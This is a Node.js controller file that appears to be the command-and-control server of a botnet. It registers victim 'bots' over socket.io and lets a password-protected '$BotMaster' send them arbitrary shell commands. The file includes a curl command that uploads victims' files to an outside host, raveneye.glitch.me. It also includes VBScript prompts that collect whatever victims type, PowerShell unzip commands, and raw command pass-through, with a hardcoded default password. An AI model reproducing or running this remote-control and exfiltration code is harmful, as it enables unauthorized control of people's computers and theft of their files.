// controllers/botController.js
const fs = require("fs");
const path = require("path");

let BotList = [];
let adminID = null;
const password = process.env.BOT_PASSWORD || '3760'; // Use environment variable for password

const uploadedFilesPath = path.join(__dirname, "..", "uploadedFiles.json");

const logCommand = (data) => {
  const logFile = path.join(__dirname, "..", "commands.log");
  const logEntry = `${new Date().toISOString()} - User: ${data.user}, Command: ${data.cmd}\n`;
  fs.appendFileSync(logFile, logEntry, "utf8");
};

const getUploadedFiles = () => {
  try {
    if (fs.existsSync(uploadedFilesPath)) {
      const fileData = fs.readFileSync(uploadedFilesPath, "utf8");
      return JSON.parse(fileData);
    } else {
      return [];
    }
  } catch (err) {
    console.error("Error reading uploaded files:", err);
    return [];
  }
};

const handleCommand = (data, socket, io) => {
  logCommand(data);

  if (
    data.cmd === "uplist" ||
    data.cmd === "downlist" ||
    data.cmd === "downld" ||
    data.cmd === "upld"
  ) {
    if (socket.id !== adminID) {
      io.to(socket.id).emit("BotReply", "Access Denied!");
      return;
    }
  }

  if (data.cmd === "uplist") {
    const uploadedFiles = getUploadedFiles();
    if (uploadedFiles.length > 0) {
      let fileList = "Uploaded files:\n";
      uploadedFiles.forEach((file, index) => {
        fileList += `${index + 1}. ${file.fileName} - ${file.fileUrl}\n`;
      });
      io.to(socket.id).emit("BotReply", fileList);
    } else {
      io.to(socket.id).emit("BotReply", "No files uploaded yet.");
    }
    return;
  }

  if (data.cmd === "downlist") {
    const files = getFilesInDirectory(path.join(__dirname, "..", "downloads"));
    io.to(socket.id).emit("BotReply", `Downloaded files:\n${files.join("\n")}`);
    return;
  }

  if (data.user === "$BotMaster" && data.cmd === password) {
    adminID = socket.id;
    io.to(adminID).emit("BotList", BotList);
  } else if (data.user === "$BotMaster" && socket.id !== adminID && data.cmd !== password) {
    io.to(socket.id).emit("BotReply", "Access Denied!");
  }

  if (adminID && data.cmd !== password) {
    if (data.user !== "$BotMaster") {
      const botres = `${data.user} :\n${data.cmd}`;
      io.to(adminID).emit("BotReply", botres);
    } else {
      if (
        data.target.length === 0 &&
        data.cmd != "downlist" &&
        data.cmd != "uplist" &&
        data.cmd != "downld"
      ) {
        io.to(adminID).emit("BotReply", "No Bots Online or selected!");
      } else {
        data.target.forEach((target) => {
          const bot = BotList.find((object) => object.botName === target);
          if (bot) {
            // Command logic for bots
            if (data.cmd.startsWith("upld")) {
              let upfiles = data.cmd.split("&&");
              upfiles.shift();
              for (let i = 0; i < upfiles.length; i++) {
                upfiles[i] = '-F "file=@' + upfiles[i] + '"';
              }
              let uploadFileNames = upfiles.join(" ");
              io.to(bot.socketId).emit(
                "cmd",
                "curl -X POST " +
                  uploadFileNames +
                  " https://raveneye.glitch.me/upload"
              );
            } else if (data.cmd.startsWith("warn ")) {
              let warningmsg = data.cmd.split(" ").slice(1).join(" ");
              io.to(bot.socketId).emit(
                "cmd",
                'echo MsgBox "' +
                  warningmsg +
                  '", 48, "Warning" > temp.vbs && temp.vbs && del temp.vbs'
              );
            } else if (data.cmd.startsWith("unzip ")) {
              let unzipmsg = data.cmd.split(" ");
              unzipmsg.shift();
              let zipmsg =
                `powershell -command \"Expand-Archive -Path '` +
                unzipmsg[0] +
                `' -DestinationPath '.'"`;
              io.to(bot.socketId).emit("cmd", zipmsg);
            } else if (data.cmd.startsWith("ask ")) {
              let question = data.cmd.split(" ").slice(1).join(" ");
              let questString =
                `echo input = InputBox("` +
                question +
                `:", "Input Prompt") > temp.vbs && echo Set fso = CreateObject("Scripting.FileSystemObject") >> temp.vbs && echo Set file = fso.CreateTextFile("output.txt", True) >> temp.vbs && echo file.WriteLine(input) >> temp.vbs && echo file.Close >> temp.vbs && cscript //nologo temp.vbs && del temp.vbs && type output.txt && del output.txt`;
              io.to(bot.socketId).emit("cmd", questString);
            } else {
              io.to(bot.socketId).emit("cmd", data.cmd);
            }
          }
        });
      }
    }
  } else {
    io.to(adminID).emit("BotReply", "clear");
  }
};

const handleBotConnection = (socket, io) => {
  socket.on("intro", (user) => {
    if (user !== "$BotMaster") {
      BotList.push({ botName: user, socketId: socket.id });
      if (adminID) {
        io.to(adminID).emit("BotList", BotList);
      }
    }
  });

  socket.on("command", (data) => handleCommand(data, socket, io));

  socket.on("disconnect", () => {
    if (socket.id !== adminID) {
      const index = BotList.findIndex((bot) => bot.socketId === socket.id);
      if (index !== -1) {
        BotList.splice(index, 1);
      }
      io.to(adminID).emit("BotList", BotList);
    }
  });
};

module.exports = { handleBotConnection };
